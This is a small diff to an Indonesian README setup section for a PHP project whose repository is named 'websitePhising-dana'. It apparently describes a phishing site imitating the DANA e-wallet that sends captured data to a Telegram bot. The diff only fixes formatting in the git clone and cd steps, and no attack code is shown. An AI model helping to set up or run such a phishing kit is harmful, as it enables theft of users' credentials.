@@ -15,7 +15,8 @@ Proyek ini adalah aplikasi web sederhana menggunakan PHP yang dapat mengirimkan 
 # 🚀 Cara Menjalankan Proyek Ini
 ## 1. Clone atau Download Proyek
 bash\n
-`git clone https://github.com/tsaqifassajeed/websitePhising-dana.git\n`
+`git clone https://github.com/tsaqifassajeed/websitePhising-dana.git`
+
 `cd websitePhising-dana`
 
 ## 2. Buat Bot Telegram
